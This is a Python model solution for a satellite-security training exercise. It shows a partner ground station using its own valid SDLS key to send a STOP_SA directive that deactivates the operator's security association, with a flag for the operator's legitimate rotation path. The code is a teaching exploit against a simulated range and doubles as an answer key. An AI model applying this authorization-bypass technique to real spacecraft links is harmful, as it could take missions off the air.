#!/usr/bin/env python3
"""EX-S04 model solution: retire the operator's key with a valid MAC you were never given for it.

SA management by telecommand is a real mission's job - CCSDS 355.1 Extended Procedures. This range
implements the STOP_SA directive, and the question is who may send it. You are a PARTNER station:
you hold your own Security Association (SPI 11) on this link, the way a cross-support antenna does,
and your frames verify. You do NOT hold the operator's key. Watch what that is enough to do.

    phase 1   the operator commands on SPI 9              -> accepted (its own key works)
    phase 2   YOU send STOP_SA(9), framed under SPI 11    -> a valid MAC, a different owner
    phase 3   the operator commands on SPI 9 again        -> REFUSED, DEACTIVATED, on the vulnerable
                                                              build; still accepted on the hardened

One station plays both parts by switching which SA it frames under, because on the wire that is the
whole difference: the operator and the partner are two valid MACs, and only an authorisation bound
to the SA's OWNER tells them apart.

    --legitimate   instead, retire SPI 9 the way the OPERATOR would - authenticated under its own
                   second association (SPI 10, same owner). On the hardened build this is allowed:
                   it is EX-S03's rotation done on the wire, and it proves the fix did not simply
                   make SA management impossible.
"""
import argparse
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange import ports                                       # noqa: E402
from cuberange.gs.link import SpaceLink                           # noqa: E402
from cuberange.gs.station import GroundStation                    # noqa: E402
from cuberange.identity import GROUND_STATIONS, GROUND_VCIDS      # noqa: E402
from cuberange.keys import (SDLS_KEY, SDLS_KEY_PARTNER, SDLS_KEY_ROTATED,  # noqa: E402
                            SDLS_SPI, SDLS_SPI_PARTNER, SDLS_SPI_ROTATED)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--legitimate", action="store_true",
                    help="retire SPI 9 as the operator (from SPI 10), not as the partner")
    ap.add_argument("--commands", type=int, default=4)
    args = ap.parse_args()

    link = SpaceLink(port=ports.link(0))
    link.connect(retries=60)
    station = GroundStation(link, station_id=GROUND_STATIONS["primary"],
                            vcid=GROUND_VCIDS["primary"],
                            require_signed_tm=SDLS_KEY, uplink_key=SDLS_KEY,
                            sdls_key=SDLS_KEY, sdls_spi=SDLS_SPI)

    def listen(seconds: float) -> None:
        deadline = time.time() + seconds
        while time.time() < deadline:
            station.collect()
            time.sleep(0.25)

    try:
        listen(6.0)
        # phase 1: the operator's own key works.
        for _ in range(args.commands):
            station.send_connection_test()
            listen(1.0)
        before = len(station.acknowledged)

        # phase 2: retire SPI 9. As the partner (the attack) or as the operator (the feature).
        if args.legitimate:
            who, key, spi = "the operator (from SPI 10)", SDLS_KEY_ROTATED, SDLS_SPI_ROTATED
        else:
            who, key, spi = "a PARTNER (SPI 11)", SDLS_KEY_PARTNER, SDLS_SPI_PARTNER
        station.sdls_key, station.sdls_spi = key, spi
        station.send_sa_stop(SDLS_SPI)
        listen(2.0)

        # phase 3: the operator tries to command on SPI 9 again.
        station.sdls_key, station.sdls_spi = SDLS_KEY, SDLS_SPI
        for _ in range(args.commands):
            station.send_connection_test()
            listen(1.0)
        after = len(station.acknowledged) - before
        listen(4.0)

        print(f"  STOP_SA(9) was sent by:                {who}")
        print(f"  operator commands before:             {before}/{args.commands} acknowledged")
        print(f"  operator commands after:              {after}/{args.commands} acknowledged")
        print(f"  the association the radio last refused: {station.link_refused_spi}")
        if after == 0:
            print(f"  SPI {SDLS_SPI} is DEACTIVATED. A frame that verified took the operator off the")
            print("  air - and on the vulnerable build the frame was the PARTNER's, holding a key")
            print("  it was never given authority over SPI 9 with. Authenticated is not authorised.")
        else:
            print(f"  SPI {SDLS_SPI} still answers. The directive was refused (hardened) or it came")
            print("  from an owner entitled to send it (--legitimate). Look at the COMM console: it")
            print("  names WHO tried, and that name is the only place the difference exists.")
    finally:
        link.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
